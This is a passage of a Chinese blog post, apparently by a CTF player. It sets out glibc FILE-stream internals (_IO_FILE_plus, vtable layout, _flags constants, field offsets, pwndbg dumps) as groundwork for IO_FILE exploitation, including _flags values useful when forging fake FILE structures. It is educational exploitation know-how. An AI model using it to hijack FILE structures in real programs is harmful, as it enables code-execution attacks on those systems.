    <content type="html"><![CDATA[<blockquote><p>顺风瞎几把 🐑 ，绝境 IOFILE。</p><footer><strong>《 :sheep: 与非 :sheep: 》</strong></footer></blockquote><p>👴 太喜欢这个 IO 玩意了，无敌帅。👴 单方面宣布 <strong>IO</strong> 是 glibc 唯一真神。</p><p>感谢 <strong>风沐云烟</strong> 师傅教我的 IO 一整条利用路线和耐心解答，<strong>风沐沐</strong> 我滴超人。</p><h1>基础知识学习</h1><h2 id="IO-FILE主要结构"><a class="header-anchor" href="#IO-FILE主要结构">¶</a>_IO_FILE主要结构</h2><h3 id="IO-FILE-plus"><a class="header-anchor" href="#IO-FILE-plus">¶</a>_IO_FILE_plus</h3><p>首先是_IO_FILE_plus，每个 _IO_FILE 结构体都被包含在一个 _IO_FILE_plus 结构体之中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><span class="hljs-comment">//虚函数表</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中的 vtable 是指向一系列函数的一张表， _IO_jump_t 结构体结构如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br></code></pre></td></tr></table></figure><h3 id="FILE"><a class="header-anchor" href="#FILE">¶</a>FILE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-comment">/* We always allocate an extra word following an _IO_FILE.</span><br><span class="hljs-comment">   This contains a pointer to the function jump table used.</span><br><span class="hljs-comment">   This is for compatibility with C++ streambuf; the word can</span><br><span class="hljs-comment">   be used to smash to a pointer to a virtual function table. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>此外，通过 gdb 我们可以很容易的查看某个 FILE 结构体内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stderr_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad2087</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffff7dce703</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffff7dce704</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x7ffff7dce760</span>,<br>    _fileno = <span class="hljs-number">0x2</span>,<br>    _flags2 = <span class="hljs-number">0x0</span>,<br>    _old_offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _cur_column = <span class="hljs-number">0x0</span>,<br>    _vtable_offset = <span class="hljs-number">0x0</span>,<br>    _shortbuf = &#123;<span class="hljs-number">0x0</span>&#125;,<br>    _lock = <span class="hljs-number">0x7ffff7dcf8b0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffff7dcd780</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0x0</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffff7dca2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>_flags</strong> 这个位置其实比较关键，后面我们要弄清楚怎么设置的才能进入我们想要的函数，完成相关利用。当然伪造的时候我们都是根据具体函数来精心构造的，但特别好用的有俩：<code>0</code> 和 <code>0xfbad1800</code> 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="hljs-comment">/* Magic number */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="hljs-comment">/* Emulate old stdio. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_BUF 1 <span class="hljs-comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_UNBUFFERED 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_READS 4 <span class="hljs-comment">/* Reading not allowed */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_NO_WRITES 8 <span class="hljs-comment">/* Writing not allowd */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_EOF_SEEN 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_ERR_SEEN 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="hljs-comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINKED 0x80 <span class="hljs-comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IN_BACKUP 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_LINE_BUF 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="hljs-comment">/* Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF 0x2000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_BAD_SEEN 0x4000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_LOCK 0x8000</span><br></code></pre></td></tr></table></figure><p><strong>ray-cp</strong> 师傅脚本里偷的结构体的各种偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ray-cp/pwn_debug/pwn_debug/IO_FILE_plus.py</span><br><br>_IO_FILE_plus_size = &#123;<br><span class="hljs-string">&#x27;i386&#x27;</span>:<span class="hljs-number">0x98</span>,<br><span class="hljs-string">&#x27;amd64&#x27;</span>:<span class="hljs-number">0xe0</span><br>&#125;<br>_IO_FILE_plus = &#123;<br>    <span class="hljs-string">&#x27;i386&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x4</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0xc</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x14</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x1c</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x24</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x2c</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x34</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x3c</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x44</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x46</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x47</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x4c</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x54</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0x5c</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0x64</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0x6c</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0x94</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;,<br><br>    <span class="hljs-string">&#x27;amd64&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x50</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x70</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x74</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x78</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x80</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x82</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x83</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x88</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x90</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x98</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0xa8</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0xb0</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0xb8</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0xc0</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0xc4</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0xd8</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="vtable"><a class="header-anchor" href="#vtable">¶</a>vtable</h3><p><strong>vtable</strong> 是干啥的？ vtable 指针指向的是 👴 这个 IOFILE 结构体对应的函数表，上调试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stdin_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad208b</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffb4188da84</span>,<br>...<br>    _lock = <span class="hljs-number">0x7ffb4188f8d0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffb4188dae0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0xffffffff</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffb4188a2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面是 stdin 结构体，下面是它的 vtable：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x *_IO_2_1_stdin_.vtable<br>$<span class="hljs-number">3</span> = &#123;<br>  __dummy = <span class="hljs-number">0x0</span>,<br>  __dummy2 = <span class="hljs-number">0x0</span>,<br>  __finish = <span class="hljs-number">0x7ffb4152e330</span>,<br>  __overflow = <span class="hljs-number">0x7ffb4152f300</span>,<br>  __underflow = <span class="hljs-number">0x7ffb4152f020</span>,<br>  __uflow = <span class="hljs-number">0x7ffb415303c0</span>,<br>  __pbackfail = <span class="hljs-number">0x7ffb41531c50</span>,<br>  __xsputn = <span class="hljs-number">0x7ffb4152d930</span>,<br>  __xsgetn = <span class="hljs-number">0x7ffb4152d590</span>,<br>  __seekoff = <span class="hljs-number">0x7ffb4152cb90</span>,<br>  __seekpos = <span class="hljs-number">0x7ffb41530990</span>,<br>  __setbuf = <span class="hljs-number">0x7ffb4152c850</span>,<br>  __sync = <span class="hljs-number">0x7ffb4152c6d0</span>,<br>  __doallocate = <span class="hljs-number">0x7ffb41520100</span>,<br>  __read = <span class="hljs-number">0x7ffb4152d910</span>,<br>  __write = <span class="hljs-number">0x7ffb4152d190</span>,<br>  __seek = <span class="hljs-number">0x7ffb4152c910</span>,<br>  __close = <span class="hljs-number">0x7ffb4152c840</span>,<br>  __stat = <span class="hljs-number">0x7ffb4152d180</span>,<br>  __showmanyc = <span class="hljs-number">0x7ffb41531dd0</span>,<br>  __imbue = <span class="hljs-number">0x7ffb41531de0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>那么我在 stdin 相关的 IO 函数调用函数指针时就会从 stdin 的 vtable 里面查找相关的函数指针：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">   <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br> || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>     &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br> )<br>&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//如果输出缓冲区有数据，刷新输出缓冲区<br></code></pre></td></tr></table></figure><p>比如这个 <code>_IO_OVERFLOW</code> 就会顺着 👴 的 stdin 的 vtable 摸到 <code>__overflow = 0x7f3f23542790 &lt;_IO_new_file_overflow&gt;</code> 。</p><p>当然这里是<strong>调用不了</strong> <code>_IO_OVERFLOW</code> 的，因为 👴 还没 🐑 它，我只是举个例子说明一下。</p><h2 id="IO-list-all-指针"><a class="header-anchor" href="#IO-list-all-指针">¶</a>_IO_list_all 指针</h2><p>处于 libc 段的 _IO_list_all 指针记录着<strong>最近</strong>生成的 _IO_FILE_plus 结构体，通过单链表的形式把所有的 _IO_FILE_plus 